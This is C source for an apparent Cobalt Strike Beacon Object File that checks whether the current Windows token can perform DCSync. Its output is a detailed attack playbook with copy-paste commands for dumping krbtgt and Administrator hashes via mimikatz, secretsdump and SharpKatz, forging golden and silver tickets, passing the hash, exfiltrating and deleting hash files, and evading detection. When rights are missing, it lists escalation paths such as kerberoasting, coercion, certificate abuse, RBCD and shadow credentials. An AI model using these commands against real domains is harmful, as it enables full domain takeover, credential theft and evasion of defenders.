/*
 * krb_dcsync - DCSync Capability Check
 *
 * Checks if the current token has Directory Replication permissions.
 * This BOF does NOT perform replication - it only checks capability.
 *
 * If replication rights are detected, it provides full operator guidance
 * for performing DCSync using the Beacon/agent (not the BOF).
 *
 * Required permissions checked:
 *   - DS-Replication-Get-Changes       (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
 *   - DS-Replication-Get-Changes-All   (1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
 *
 * Usage: krb_dcsync /domain:DOMAIN [/dc:DC] [/check]
 */

#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* LDAP declarations */
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_initA(PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_bind_sA(PVOID, PCHAR, PCHAR, ULONG);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_unbind(PVOID);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_search_sA(PVOID, PCHAR, ULONG, PCHAR, PCHAR*, ULONG, PVOID*);
DECLSPEC_IMPORT PVOID WINAPI WLDAP32$ldap_first_entry(PVOID, PVOID);
DECLSPEC_IMPORT PCHAR* WINAPI WLDAP32$ldap_get_valuesA(PVOID, PVOID, PCHAR);
DECLSPEC_IMPORT VOID WINAPI WLDAP32$ldap_value_freeA(PCHAR*);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_msgfree(PVOID);

/* berval for binary data */
typedef struct berval {
    ULONG bv_len;
    PCHAR bv_val;
} BERVAL;

DECLSPEC_IMPORT struct berval** WINAPI WLDAP32$ldap_get_values_lenA(PVOID, PVOID, PCHAR);
DECLSPEC_IMPORT ULONG WINAPI WLDAP32$ldap_value_free_len(struct berval**);

/* Token/SID declarations */
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$LookupAccountSidA(LPCSTR, PSID, LPSTR, LPDWORD, LPSTR, LPDWORD, PSID_NAME_USE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ConvertSidToStringSidA(PSID, LPSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$IsWellKnownSid(PSID, WELL_KNOWN_SID_TYPE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$EqualSid(PSID, PSID);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$AllocateAndInitializeSid(PSID_IDENTIFIER_AUTHORITY, BYTE, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, DWORD, PSID*);
DECLSPEC_IMPORT PVOID WINAPI ADVAPI32$FreeSid(PSID);
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);

/* LDAP constants */
#define LDAP_SCOPE_BASE 0
#define LDAP_SCOPE_SUBTREE 2
#define LDAP_AUTH_NEGOTIATE 0x0486
#define LDAP_PORT 389
#define LDAP_SUCCESS 0

/* Token access */
#define TOKEN_QUERY 0x0008

/* Well-known SIDs for DCSync capability */
#define SECURITY_NT_AUTHORITY {0,0,0,0,0,5}
#define DOMAIN_ALIAS_RID_ADMINS 0x00000220
#define DOMAIN_GROUP_RID_ADMINS 0x00000200
#define DOMAIN_GROUP_RID_ENTERPRISE_ADMINS 0x00000207
#define DOMAIN_GROUP_RID_CONTROLLERS 0x00000204

/* DS-Replication GUIDs (for reference in output) */
static const char* DS_REPL_GET_CHANGES = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2";
static const char* DS_REPL_GET_CHANGES_ALL = "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2";
static const char* DS_REPL_GET_CHANGES_FILTERED = "89e95b76-444d-4c62-991a-0facbeda640c";

/* Capability result */
typedef struct {
    int isDomainAdmin;
    int isEnterpriseAdmin;
    int isDomainController;
    int isBuiltinAdmin;
    int hasExplicitRights;
    char currentUser[256];
    char domainSID[128];
} DCSYNC_CAPABILITY;

/* Get current username and token groups */
static void get_token_info(formatp* output, DCSYNC_CAPABILITY* cap) {
    HANDLE hToken = NULL;
    DWORD tokenInfoLen = 0;
    PTOKEN_GROUPS pTokenGroups = NULL;

    cap->isDomainAdmin = 0;
    cap->isEnterpriseAdmin = 0;
    cap->isDomainController = 0;
    cap->isBuiltinAdmin = 0;
    cap->hasExplicitRights = 0;
    cap->currentUser[0] = '\0';
    cap->domainSID[0] = '\0';

    /* Get current process token */
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        BeaconFormatPrintf(output, "[-] Failed to open process token: %d\n", KERNEL32$GetLastError());
        return;
    }

    /* Get token user */
    TOKEN_USER* pTokenUser = NULL;
    ADVAPI32$GetTokenInformation(hToken, TokenUser, NULL, 0, &tokenInfoLen);
    pTokenUser = (TOKEN_USER*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, tokenInfoLen);
    if (pTokenUser && ADVAPI32$GetTokenInformation(hToken, TokenUser, pTokenUser, tokenInfoLen, &tokenInfoLen)) {
        char name[256] = {0};
        char domain[256] = {0};
        DWORD nameLen = sizeof(name);
        DWORD domainLen = sizeof(domain);
        SID_NAME_USE sidType;

        if (ADVAPI32$LookupAccountSidA(NULL, pTokenUser->User.Sid, name, &nameLen, domain, &domainLen, &sidType)) {
            sprintf(cap->currentUser, "%s\\%s", domain, name);
        }

        /* Get domain SID (user SID minus RID) */
        LPSTR sidString = NULL;
        if (ADVAPI32$ConvertSidToStringSidA(pTokenUser->User.Sid, &sidString)) {
            /* Extract domain SID (everything except last component) */
            char* lastDash = strrchr(sidString, '-');
            if (lastDash) {
                *lastDash = '\0';
                strcpy(cap->domainSID, sidString);
            }
            KERNEL32$LocalFree(sidString);
        }
    }
    if (pTokenUser) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTokenUser);

    /* Get token groups */
    tokenInfoLen = 0;
    ADVAPI32$GetTokenInformation(hToken, TokenGroups, NULL, 0, &tokenInfoLen);
    pTokenGroups = (PTOKEN_GROUPS)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, tokenInfoLen);

    if (!pTokenGroups) {
        KERNEL32$CloseHandle(hToken);
        return;
    }

    if (!ADVAPI32$GetTokenInformation(hToken, TokenGroups, pTokenGroups, tokenInfoLen, &tokenInfoLen)) {
        BeaconFormatPrintf(output, "[-] Failed to get token groups: %d\n", KERNEL32$GetLastError());
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTokenGroups);
        KERNEL32$CloseHandle(hToken);
        return;
    }

    BeaconFormatPrintf(output, "[*] Checking token group memberships...\n\n");

    /* Check each group */
    for (DWORD i = 0; i < pTokenGroups->GroupCount; i++) {
        PSID pSid = pTokenGroups->Groups[i].Sid;
        char name[256] = {0};
        char domain[256] = {0};
        DWORD nameLen = sizeof(name);
        DWORD domainLen = sizeof(domain);
        SID_NAME_USE sidType;

        if (ADVAPI32$LookupAccountSidA(NULL, pSid, name, &nameLen, domain, &domainLen, &sidType)) {
            /* Check for privileged groups */
            if (_stricmp(name, "Domain Admins") == 0) {
                cap->isDomainAdmin = 1;
                BeaconFormatPrintf(output, "    [+] DOMAIN ADMINS member detected!\n");
            }
            else if (_stricmp(name, "Enterprise Admins") == 0) {
                cap->isEnterpriseAdmin = 1;
                BeaconFormatPrintf(output, "    [+] ENTERPRISE ADMINS member detected!\n");
            }
            else if (_stricmp(name, "Domain Controllers") == 0) {
                cap->isDomainController = 1;
                BeaconFormatPrintf(output, "    [+] DOMAIN CONTROLLERS member detected!\n");
            }
            else if (_stricmp(name, "Administrators") == 0 && _stricmp(domain, "BUILTIN") == 0) {
                cap->isBuiltinAdmin = 1;
                BeaconFormatPrintf(output, "    [+] BUILTIN\\Administrators member detected!\n");
            }
        }
    }

    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, pTokenGroups);
    KERNEL32$CloseHandle(hToken);
}

/* Check domain naming context accessibility via LDAP */
static int check_ldap_access(const char* domain, const char* dc, formatp* output, char* searchBase, int searchBaseLen) {
    PVOID ldap = WLDAP32$ldap_initA((PCHAR)dc, LDAP_PORT);
    if (!ldap) {
        BeaconFormatPrintf(output, "[-] Failed to connect to LDAP on %s\n", dc);
        return 0;
    }

    ULONG ldapResult = WLDAP32$ldap_bind_sA(ldap, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (ldapResult != LDAP_SUCCESS) {
        BeaconFormatPrintf(output, "[-] LDAP bind failed: %d\n", ldapResult);
        WLDAP32$ldap_unbind(ldap);
        return 0;
    }

    BeaconFormatPrintf(output, "[+] LDAP connection successful to %s\n", dc);

    /* Build search base from domain */
    searchBase[0] = '\0';
    char* domainCopy = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, strlen(domain) + 1);
    strcpy(domainCopy, domain);
    strcpy(searchBase, "DC=");
    char* part = strtok(domainCopy, ".");
    int first = 1;
    while (part) {
        if (!first) strcat(searchBase, ",DC=");
        strcat(searchBase, part);
        first = 0;
        part = strtok(NULL, ".");
    }
    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, domainCopy);

    BeaconFormatPrintf(output, "[*] Domain NC: %s\n\n", searchBase);

    WLDAP32$ldap_unbind(ldap);
    return 1;
}

/* Print capability assessment */
static int assess_capability(DCSYNC_CAPABILITY* cap, formatp* output) {
    int capable = 0;

    BeaconFormatPrintf(output, "\n================================================================================\n");
    BeaconFormatPrintf(output, "                    DCSYNC CAPABILITY ASSESSMENT\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "[*] Current Identity: %s\n\n", cap->currentUser[0] ? cap->currentUser : "(unknown)");

    BeaconFormatPrintf(output, "PRIVILEGED GROUP MEMBERSHIP:\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "    Domain Admins:        %s\n", cap->isDomainAdmin ? "[YES] - HAS REPLICATION RIGHTS" : "[NO]");
    BeaconFormatPrintf(output, "    Enterprise Admins:    %s\n", cap->isEnterpriseAdmin ? "[YES] - HAS REPLICATION RIGHTS" : "[NO]");
    BeaconFormatPrintf(output, "    Domain Controllers:   %s\n", cap->isDomainController ? "[YES] - HAS REPLICATION RIGHTS" : "[NO]");
    BeaconFormatPrintf(output, "    BUILTIN\\Admins:       %s\n\n", cap->isBuiltinAdmin ? "[YES] - May have rights on DC" : "[NO]");

    BeaconFormatPrintf(output, "REQUIRED PERMISSIONS FOR DCSYNC:\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "    DS-Replication-Get-Changes:     %s\n", DS_REPL_GET_CHANGES);
    BeaconFormatPrintf(output, "    DS-Replication-Get-Changes-All: %s\n\n", DS_REPL_GET_CHANGES_ALL);

    /* Determine capability */
    if (cap->isDomainAdmin || cap->isEnterpriseAdmin || cap->isDomainController) {
        capable = 1;
        BeaconFormatPrintf(output, "================================================================================\n");
        BeaconFormatPrintf(output, "  [+] REPLICATION-CAPABLE TOKEN DETECTED\n");
        BeaconFormatPrintf(output, "================================================================================\n\n");
        BeaconFormatPrintf(output, "Your current token has membership in a group that grants DCSync rights.\n");
        BeaconFormatPrintf(output, "You can proceed with replication attacks.\n\n");
    } else {
        BeaconFormatPrintf(output, "================================================================================\n");
        BeaconFormatPrintf(output, "  [-] NOT AUTHORIZED FOR DCSYNC\n");
        BeaconFormatPrintf(output, "================================================================================\n\n");
        BeaconFormatPrintf(output, "Your current token does not appear to have replication rights.\n\n");
        BeaconFormatPrintf(output, "To gain DCSync capability, you need one of:\n");
        BeaconFormatPrintf(output, "  1. Domain Admin membership\n");
        BeaconFormatPrintf(output, "  2. Enterprise Admin membership\n");
        BeaconFormatPrintf(output, "  3. Domain Controller account\n");
        BeaconFormatPrintf(output, "  4. Explicit DS-Replication-Get-Changes + DS-Replication-Get-Changes-All\n\n");
    }

    return capable;
}

/* Print DCSync execution guidance */
static void print_dcsync_guidance(const char* domain, const char* dc, DCSYNC_CAPABILITY* cap, formatp* output) {

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "                    DCSYNC EXECUTION GUIDE\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "The replication attack is performed by your Beacon/agent, NOT this BOF.\n");
    BeaconFormatPrintf(output, "Copy/paste the commands below to execute DCSync.\n\n");

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  METHOD 1: COBALT STRIKE BUILT-IN (Recommended)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "# DCSync single user - Get krbtgt hash for Golden Ticket:\n");
    BeaconFormatPrintf(output, "dcsync %s krbtgt\n\n", domain);

    BeaconFormatPrintf(output, "# DCSync Administrator:\n");
    BeaconFormatPrintf(output, "dcsync %s Administrator\n\n", domain);

    BeaconFormatPrintf(output, "# DCSync specific user:\n");
    BeaconFormatPrintf(output, "dcsync %s TARGET_USER\n\n", domain);

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  METHOD 2: MIMIKATZ (via execute-assembly or BOF)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "# Single user (krbtgt for Golden Ticket):\n");
    BeaconFormatPrintf(output, "mimikatz lsadump::dcsync /domain:%s /user:krbtgt\n\n", domain);

    BeaconFormatPrintf(output, "# Single user (Administrator):\n");
    BeaconFormatPrintf(output, "mimikatz lsadump::dcsync /domain:%s /user:Administrator\n\n", domain);

    BeaconFormatPrintf(output, "# All users (OPSEC: generates significant traffic):\n");
    BeaconFormatPrintf(output, "mimikatz lsadump::dcsync /domain:%s /all /csv\n\n", domain);

    BeaconFormatPrintf(output, "# Specific DC target:\n");
    BeaconFormatPrintf(output, "mimikatz lsadump::dcsync /domain:%s /dc:%s /user:krbtgt\n\n", domain, dc);

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  METHOD 3: SECRETSDUMP.PY (From Linux attack host)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "# Using password authentication:\n");
    BeaconFormatPrintf(output, "secretsdump.py '%s/%s:PASSWORD'@%s\n\n", domain, cap->currentUser[0] ? cap->currentUser : "USER", dc);

    BeaconFormatPrintf(output, "# Using NTLM hash (Pass-the-Hash):\n");
    BeaconFormatPrintf(output, "secretsdump.py -hashes :NTLM_HASH '%s/%s'@%s\n\n", domain, cap->currentUser[0] ? cap->currentUser : "USER", dc);

    BeaconFormatPrintf(output, "# Using Kerberos ticket (after krb_ptt):\n");
    BeaconFormatPrintf(output, "export KRB5CCNAME=/path/to/ticket.ccache\n");
    BeaconFormatPrintf(output, "secretsdump.py -k -no-pass %s/%s@%s\n\n", domain, cap->currentUser[0] ? cap->currentUser : "USER", dc);

    BeaconFormatPrintf(output, "# NTLM hashes only (faster):\n");
    BeaconFormatPrintf(output, "secretsdump.py -just-dc-ntlm '%s/USER:PASS'@%s\n\n", domain, dc);

    BeaconFormatPrintf(output, "# Single user only:\n");
    BeaconFormatPrintf(output, "secretsdump.py -just-dc-user krbtgt '%s/USER:PASS'@%s\n\n", domain, dc);

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  METHOD 4: SHARPKATZ / BETTERSAFETYKATZ (C# Assembly)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "# SharpKatz DCSync:\n");
    BeaconFormatPrintf(output, "execute-assembly SharpKatz.exe --Command dcsync --User krbtgt --Domain %s --DomainController %s\n\n", domain, dc);

    BeaconFormatPrintf(output, "# BetterSafetyKatz:\n");
    BeaconFormatPrintf(output, "execute-assembly BetterSafetyKatz.exe \"lsadump::dcsync /domain:%s /user:krbtgt\"\n\n", domain);

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  PRIORITY TARGETS FOR DCSYNC\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "Target these accounts in order of priority:\n\n");

    BeaconFormatPrintf(output, "1. krbtgt\n");
    BeaconFormatPrintf(output, "   - Creates Golden Tickets (full domain compromise)\n");
    BeaconFormatPrintf(output, "   - Command: dcsync %s krbtgt\n\n", domain);

    BeaconFormatPrintf(output, "2. Administrator\n");
    BeaconFormatPrintf(output, "   - Built-in Domain Admin account\n");
    BeaconFormatPrintf(output, "   - Command: dcsync %s Administrator\n\n", domain);

    BeaconFormatPrintf(output, "3. Domain Controller machine accounts (DC$)\n");
    BeaconFormatPrintf(output, "   - Silver Ticket to DC services\n");
    BeaconFormatPrintf(output, "   - Command: dcsync %s %s$\n\n", domain, dc);

    BeaconFormatPrintf(output, "4. Service accounts with SPNs\n");
    BeaconFormatPrintf(output, "   - Kerberoastable accounts for lateral movement\n");
    BeaconFormatPrintf(output, "   - Find with: krb_kerberoast /domain:%s\n\n", domain);

    BeaconFormatPrintf(output, "5. AZUREADSSOACC (if Azure AD Connect exists)\n");
    BeaconFormatPrintf(output, "   - Seamless SSO account for Azure attacks\n");
    BeaconFormatPrintf(output, "   - Command: dcsync %s AZUREADSSOACC$\n\n", domain);

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  POST-DCSYNC ACTIONS\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "GOLDEN TICKET (after obtaining krbtgt hash):\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Create Golden Ticket with Mimikatz:\n");
    BeaconFormatPrintf(output, "mimikatz kerberos::golden /user:Administrator /domain:%s /sid:%s /krbtgt:KRBTGT_HASH /ptt\n\n",
        domain, cap->domainSID[0] ? cap->domainSID : "S-1-5-21-DOMAIN-SID");

    BeaconFormatPrintf(output, "# Or with our BOF:\n");
    BeaconFormatPrintf(output, "krb_golden /user:Administrator /domain:%s /sid:%s /krbtgt:KRBTGT_HASH /ptt\n\n",
        domain, cap->domainSID[0] ? cap->domainSID : "S-1-5-21-DOMAIN-SID");

    BeaconFormatPrintf(output, "PASS-THE-HASH (after obtaining NTLM hash):\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Request TGT with hash:\n");
    BeaconFormatPrintf(output, "krb_asktgt /user:Administrator /domain:%s /rc4:NTLM_HASH /ptt\n\n", domain);

    BeaconFormatPrintf(output, "# Or with Overpass-the-Hash:\n");
    BeaconFormatPrintf(output, "krb_overpass /user:Administrator /domain:%s /rc4:NTLM_HASH /ptt\n\n", domain);

    BeaconFormatPrintf(output, "SILVER TICKET (for specific services):\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# CIFS access to DC:\n");
    BeaconFormatPrintf(output, "krb_silver /user:Administrator /domain:%s /service:cifs/%s /rc4:DC_MACHINE_HASH /ptt\n\n", domain, dc);

    BeaconFormatPrintf(output, "# LDAP access to DC:\n");
    BeaconFormatPrintf(output, "krb_silver /user:Administrator /domain:%s /service:ldap/%s /rc4:DC_MACHINE_HASH /ptt\n\n", domain, dc);

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  SECURE EXFILTRATION\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "After DCSync, handle credentials securely:\n\n");

    BeaconFormatPrintf(output, "1. Encrypted storage:\n");
    BeaconFormatPrintf(output, "   - Encrypt output files before exfil\n");
    BeaconFormatPrintf(output, "   - Use team's GPG key or shared secret\n\n");

    BeaconFormatPrintf(output, "2. Exfiltration channels:\n");
    BeaconFormatPrintf(output, "   - Use existing C2 channel (preferred)\n");
    BeaconFormatPrintf(output, "   - download /path/to/hashes.txt (Cobalt Strike)\n");
    BeaconFormatPrintf(output, "   - Avoid secondary channels that increase footprint\n\n");

    BeaconFormatPrintf(output, "3. Cleanup:\n");
    BeaconFormatPrintf(output, "   - Delete local copies after exfil\n");
    BeaconFormatPrintf(output, "   - shell del /f /q hashes.txt\n\n");

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  OPSEC CONSIDERATIONS\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "DCSync generates the following detection artifacts:\n\n");

    BeaconFormatPrintf(output, "1. Event ID 4662 - Directory Service Access\n");
    BeaconFormatPrintf(output, "   - Properties: DS-Replication-Get-Changes\n");
    BeaconFormatPrintf(output, "   - Account: Your compromised account\n\n");

    BeaconFormatPrintf(output, "2. Network traffic to DC on port 135/TCP (RPC)\n");
    BeaconFormatPrintf(output, "   - MS-DRSR protocol (DRS replication)\n");
    BeaconFormatPrintf(output, "   - Unusual source for replication requests\n\n");

    BeaconFormatPrintf(output, "3. OPSEC recommendations:\n");
    BeaconFormatPrintf(output, "   - Execute during business hours (blend with legit replication)\n");
    BeaconFormatPrintf(output, "   - Target specific users, not /all (less traffic)\n");
    BeaconFormatPrintf(output, "   - Use a DC if you have one (normal behavior)\n");
    BeaconFormatPrintf(output, "   - Avoid repeated DCSync from same host\n\n");

    BeaconFormatPrintf(output, "================================================================================\n");
}

/* Print guidance when not capable */
static void print_escalation_guidance(const char* domain, const char* dc, formatp* output) {

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "                    ESCALATION PATHS TO DCSYNC\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "You don't have DCSync rights yet. Here are paths to obtain them:\n\n");

    BeaconFormatPrintf(output, "PATH 1: Compromise a Domain Admin account\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Find Domain Admins:\n");
    BeaconFormatPrintf(output, "net group \"Domain Admins\" /domain\n\n");
    BeaconFormatPrintf(output, "# Kerberoast service accounts:\n");
    BeaconFormatPrintf(output, "krb_kerberoast /domain:%s\n\n", domain);
    BeaconFormatPrintf(output, "# AS-REP Roast users without preauth:\n");
    BeaconFormatPrintf(output, "krb_asreproast /domain:%s\n\n", domain);

    BeaconFormatPrintf(output, "PATH 2: Unconstrained Delegation + Coercion\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Find unconstrained delegation hosts:\n");
    BeaconFormatPrintf(output, "krb_delegenum /domain:%s\n\n", domain);
    BeaconFormatPrintf(output, "# Compromise one, then coerce DC:\n");
    BeaconFormatPrintf(output, "krb_printerbug /target:%s /capture:YOURHOST /domain:%s\n\n", dc, domain);

    BeaconFormatPrintf(output, "PATH 3: AD CS Certificate Abuse\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Find vulnerable templates:\n");
    BeaconFormatPrintf(output, "cert_find /vulnerable /domain:%s\n\n", domain);
    BeaconFormatPrintf(output, "# ESC1 - Request cert as Domain Admin:\n");
    BeaconFormatPrintf(output, "cert_request /ca:CA /template:VULN /altname:administrator@%s\n\n", domain);

    BeaconFormatPrintf(output, "PATH 4: RBCD Attack\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# If you can write to msDS-AllowedToActOnBehalfOfOtherIdentity:\n");
    BeaconFormatPrintf(output, "krb_rbcd /target:DC$ /delegate:YOURCOMPUTER$ /domain:%s\n\n", domain);

    BeaconFormatPrintf(output, "PATH 5: Shadow Credentials (if you have write access to AD object)\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Add shadow credential to DC:\n");
    BeaconFormatPrintf(output, "Whisker.exe add /target:%s$ /domain:%s\n\n", dc, domain);

    BeaconFormatPrintf(output, "================================================================================\n");
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* domain = NULL;
    char* dc = NULL;
    int checkOnly = 0;

    BeaconFormatAlloc(&output, 131072);  /* 128KB for detailed output */
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n");
    BeaconFormatPrintf(&output, "================================================================================\n");
    BeaconFormatPrintf(&output, "  krb_dcsync - DCSync Capability Check\n");
    BeaconFormatPrintf(&output, "================================================================================\n\n");


    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    checkOnly = arg_exists(&parser, "check");

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "Usage: krb_dcsync /domain:DOMAIN [/dc:DC] [/check]\n\n");
            BeaconFormatPrintf(&output, "Arguments:\n");
            BeaconFormatPrintf(&output, "  /domain:DOMAIN - Target domain\n");
            BeaconFormatPrintf(&output, "  /dc:DC         - Domain Controller (optional)\n");
            BeaconFormatPrintf(&output, "  /check         - Check capability only (default behavior)\n\n");
            BeaconFormatPrintf(&output, "Examples:\n");
            BeaconFormatPrintf(&output, "  krb_dcsync /domain:corp.local\n");
            BeaconFormatPrintf(&output, "  krb_dcsync /domain:corp.local /dc:dc01.corp.local\n\n");
            BeaconFormatPrintf(&output, "This BOF checks if your current token has DCSync capability.\n");
            BeaconFormatPrintf(&output, "It does NOT perform replication - use the guidance provided\n");
            BeaconFormatPrintf(&output, "to execute DCSync via Cobalt Strike/mimikatz/secretsdump.\n");
            goto cleanup;
        }
    }

    if (!dc) {
        dc = domain;  /* Use domain name for DC lookup */
    }

    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] DC:     %s\n\n", dc);

    /* Check capability */
    DCSYNC_CAPABILITY cap = {0};
    get_token_info(&output, &cap);

    /* Check LDAP connectivity */
    char searchBase[512] = {0};
    int ldapOk = check_ldap_access(domain, dc, &output, searchBase, sizeof(searchBase));

    /* Assess capability */
    int capable = assess_capability(&cap, &output);

    /* Print guidance based on capability */
    if (capable) {
        print_dcsync_guidance(domain, dc, &cap, &output);
    } else {
        print_escalation_guidance(domain, dc, &output);
    }

cleanup:
    if (domain) free(domain);
    if (dc && dc != domain) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
